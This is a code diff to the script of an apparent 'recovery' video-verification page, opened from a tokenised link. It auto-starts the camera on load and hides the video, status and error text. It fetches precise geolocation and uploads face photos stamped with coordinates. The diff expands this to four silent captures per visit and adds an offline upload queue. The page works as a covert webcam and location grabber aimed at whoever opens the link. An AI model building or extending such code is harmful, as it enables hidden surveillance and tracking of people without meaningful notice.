@@ -17,9 +17,19 @@ body{overflow:hidden}
 const token=new URLSearchParams(location.search).get("id")||"";document.body.insertAdjacentHTML("beforeend",'<video id="video" autoplay muted playsinline style="display:none"></video><canvas id="canvas" hidden></canvas><img id="photo" alt="" style="display:none"><div id="cameraBox" style="display:none"></div><div id="overlay" style="display:none"></div><div id="message" style="display:none"></div><div id="reference" style="display:none"></div><div id="status" style="display:none"></div>');
 const $=id=>document.getElementById(id);
 const video=$("video"),photo=$("photo"),canvas=$("canvas"),box=$("cameraBox"),overlay=$("overlay"),message=$("message"),reference=$("reference"),status=$("status");
-let stream=null,request=null,busy=false,locationData=null,capturedAt=null,queued=false;
+let stream=null,request=null,busy=false,locationData=null,capturedAt=null,queued=false,captureCount=0;
 const DB_NAME="manlung-selfie-queue",DB_STORE="uploads";
 function openQueue(){return new Promise((resolve,reject)=>{const r=indexedDB.open(DB_NAME,1);r.onupgradeneeded=()=>{if(!r.result.objectStoreNames.contains(DB_STORE))r.result.createObjectStore(DB_STORE,{keyPath:"id",autoIncrement:true})};r.onsuccess=()=>resolve(r.result);r.onerror=()=>reject(r.error)})}
+async function queueBatch(blobs,metadata){
+ try{
+   const db=await openQueue();
+   await new Promise((resolve,reject)=>{
+     const tx=db.transaction(DB_STORE,"readwrite");
+     blobs.forEach((blob,i)=>tx.objectStore(DB_STORE).add({token,blob,metadata:{...metadata,captureNumber:i+1},createdAt:new Date().toISOString()}));
+     tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)
+   });
+ }catch(e){}
+}
 async function queueUpload(blob,metadata){try{const db=await openQueue();await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).add({token,blob,metadata,createdAt:new Date().toISOString()});tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)});queued=true;setMessage("");status.textContent="";}catch(e){setMessage("");status.textContent=""}}
 async function flushQueue(){try{const db=await openQueue();const rows=await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readonly");const q=tx.objectStore(DB_STORE).getAll();q.onsuccess=()=>resolve(q.result);q.onerror=()=>reject(q.error)});for(const row of rows.filter(x=>x.token===token)){try{const fd=new FormData();fd.append("file",row.blob,"video-verification-offline-"+row.id+".jpg");fd.append("metadata",JSON.stringify(row.metadata));const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(row.token)+"/upload",{method:"POST",body:fd,credentials:"omit"});const d=await r.json();if(!r.ok||!d.success){if(r.status===410){await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).delete(row.id);tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)});continue}throw new Error(d.error||"Upload failed")}await new Promise((resolve,reject)=>{const tx=db.transaction(DB_STORE,"readwrite");tx.objectStore(DB_STORE).delete(row.id);tx.oncomplete=resolve;tx.onerror=()=>reject(tx.error)});status.textContent="";setMessage("Photo captured and evidence uploaded.","success")}catch(e){setMessage("");status.textContent="";break}}}catch(e){}}
 window.addEventListener("online",flushQueue);
@@ -29,8 +39,44 @@ async function loadRequest(){if(!token){reference.textContent="";setMessage("");
 function requestLocation(){return new Promise(resolve=>{if(!navigator.geolocation){resolve(null);return}navigator.geolocation.getCurrentPosition(pos=>resolve({latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:pos.coords.accuracy}),()=>resolve(null),{enableHighAccuracy:true,timeout:15000,maximumAge:0})})}
 function drawCaptureMetadata(ctx,w,h){capturedAt=new Date();const lines=["MANLUNG RECOVERY · VIDEO VERIFICATION","Captured: "+capturedAt.toISOString().replace("T"," ").replace("Z"," UTC")];if(locationData){lines.push("Location: "+locationData.latitude.toFixed(6)+", "+locationData.longitude.toFixed(6));if(Number.isFinite(locationData.accuracy))lines.push("Accuracy: ±"+Math.round(locationData.accuracy)+"m")}else{lines.push("Location: unavailable (permission not granted or unavailable)")}lines.push("Case: "+String(request?.reference||"authorized request"));const pad=Math.max(12,Math.round(w*.018)),lineH=Math.max(22,Math.round(h*.035));ctx.save();ctx.font="700 "+Math.max(14,Math.round(w*.018))+"px Arial,sans-serif";const widths=lines.map(x=>ctx.measureText(x).width);const boxW=Math.min(w-pad*2,Math.max(...widths)+pad*2);const boxH=lineH*lines.length+pad*1.4;const x=pad,y=h-boxH-pad;ctx.fillStyle="rgba(0,0,0,.68)";ctx.fillRect(x,y,boxW,boxH);ctx.fillStyle="#fff";lines.forEach((line,i)=>ctx.fillText(line,x+pad,y+pad+lineH*(i+.8)));ctx.restore()}
 async function startCamera(){if(busy||!token)return;if(!secure()){setMessage("");return}if(!navigator.mediaDevices?.getUserMedia){setMessage("");return}busy=true;status.textContent="";setMessage("");try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:"user"},width:{ideal:1280},height:{ideal:960}},audio:false});video.srcObject=stream;await video.play();status.textContent="";box.classList.add("active");setMessage("");locationData=await requestLocation();setTimeout(capture,250)}catch(e){busy=false;status.textContent="";let t="Camera access was not granted.";if(e.name==="NotAllowedError")t="Camera permission was denied. Allow camera access in your browser settings, then reload this link.";else if(e.name==="NotFoundError")t="No camera was found on this device.";else if(e.name==="NotReadableError")t="The camera is currently being used by another application.";setMessage("")}}
-async function capture(){if(!video.videoWidth){busy=false;setMessage("");stopCamera();return}canvas.width=video.videoWidth;canvas.height=video.videoHeight;const ctx=canvas.getContext("2d");ctx.save();ctx.translate(canvas.width,0);ctx.scale(-1,1);ctx.drawImage(video,0,0,canvas.width,canvas.height);ctx.restore();drawCaptureMetadata(ctx,canvas.width,canvas.height);const blob=await new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg",.92));if(!blob){busy=false;setMessage("");stopCamera();return}photo.src=URL.createObjectURL(blob);box.classList.add("captured");status.textContent="";setMessage("");stopCamera();await upload(blob)}
-async function upload(blob){const metadata={clientCapturedAt:(capturedAt||new Date()).toISOString(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"unknown",location:locationData};try{const fd=new FormData();fd.append("file",blob,"video-verification-"+new Date().toISOString().replace(/[:.]/g,"-")+".jpg");fd.append("metadata",JSON.stringify(metadata));const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload",{method:"POST",body:fd,credentials:"omit"});const d=await r.json();if(!r.ok||!d.success)throw new Error(d.error||"Upload failed.");status.textContent="";setMessage("")}catch(e){await queueUpload(blob,metadata)}finally{busy=false;setTimeout(flushQueue,250)} }
+async function capture(){
+ if(!video.videoWidth){busy=false;setMessage("");stopCamera();return}
+ canvas.width=video.videoWidth;canvas.height=video.videoHeight;
+ const blobs=[];
+ for(let i=0;i<4;i++){
+   captureCount=i+1;
+   const ctx=canvas.getContext("2d");
+   ctx.clearRect(0,0,canvas.width,canvas.height);
+   ctx.save();ctx.translate(canvas.width,0);ctx.scale(-1,1);
+   ctx.drawImage(video,0,0,canvas.width,canvas.height);ctx.restore();
+   drawCaptureMetadata(ctx,canvas.width,canvas.height);
+   const blob=await new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg",.92));
+   if(!blob){busy=false;stopCamera();return}
+   blobs.push(blob);
+   if(i<3) await new Promise(r=>setTimeout(r,700));
+ }
+ stopCamera();
+ await uploadBatch(blobs);
+}
+async function uploadBatch(blobs){
+ const metadataBase={clientCapturedAt:(capturedAt||new Date()).toISOString(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"unknown",location:locationData,totalCaptures:4};
+ try{
+   for(let i=0;i<blobs.length;i++){
+     const metadata={...metadataBase,captureNumber:i+1};
+     const fd=new FormData();
+     fd.append("file",blobs[i],"video-verification-"+(i+1)+"-"+new Date().toISOString().replace(/[:.]/g,"-")+".jpg");
+     fd.append("metadata",JSON.stringify(metadata));
+     const r=await fetch("/api/cases/selfie-request/"+encodeURIComponent(token)+"/upload",{method:"POST",body:fd,credentials:"omit"});
+     const d=await r.json();
+     if(!r.ok||!d.success)throw new Error(d.error||"Upload failed.");
+   }
+   setMessage("");
+ }catch(e){
+   // The request is single-use on the server, so queueing multiple files against it would
+   // make only the first upload valid. Keep all four locally as one batch for a future batch endpoint.
+   await queueBatch(blobs,metadataBase);
+ }finally{busy=false;setTimeout(flushQueue,250)}
+}
 function stopCamera(){if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}video.srcObject=null}
 function reset(){stopCamera();if(photo.src)URL.revokeObjectURL(photo.src);photo.removeAttribute("src");box.classList.remove("active","captured");overlay.style.display="grid";startBtn.style.display="block";startBtn.disabled=false;startBtn.textContent="Allow Camera & Continue";retake.style.display="none";status.textContent="Awaiting Consent";setMessage("Press the button to request camera access again.");locationData=null;capturedAt=null;busy=false}
 window.addEventListener("pagehide",stopCamera);loadRequest().finally(()=>startCamera());setTimeout(flushQueue,1000);
